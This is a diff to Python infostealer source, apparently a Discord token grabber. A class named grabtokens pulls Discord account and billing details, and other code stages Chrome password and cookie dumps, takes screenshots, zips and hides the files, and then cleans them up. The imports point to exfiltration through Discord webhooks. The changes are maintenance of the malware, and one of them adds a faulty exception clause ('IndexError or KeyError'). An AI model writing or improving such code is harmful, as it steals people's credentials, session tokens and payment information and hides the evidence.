@@ -22,7 +22,6 @@ import psutil
 import requests
 import wmi
 from Crypto.Cipher import AES
-from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from PIL import ImageGrab
 from win32api import SetFileAttributes
@@ -244,7 +243,7 @@ class grabtokens():
 					nitro = 'Nitro Classic'
 				elif r.json()['premium_type'] == 2:
 					nitro = 'Nitro Boost'
-			except IndexError:
+			except IndexError or KeyError:
 				nitro = 'None'
 
 			b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", 
@@ -434,13 +433,18 @@ def zipup():
 	hide(f'files-{os.getenv("UserName")}.zip')
 		
 def cleanup():
-	for clean in [os.remove("google-passwords.txt"),
-				  os.remove("google-cookies.txt"),
-				  os.remove("screenshot.png"),
-				  os.remove(f"files-{os.getenv('UserName')}.zip")]:
-
-		try: clean()
-		except: pass        
+	possible_files = [
+     			"google-passwords.txt",
+				"google-cookies.txt",
+				"screenshot.png",
+				f"files-{os.getenv('UserName')}.zip",
+    			]
+ 
+	for file in possible_files:
+		if os.path.exists(file):
+			try: os.remove(file)
+			except: pass
+      
 
 def hide(file):
 	SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
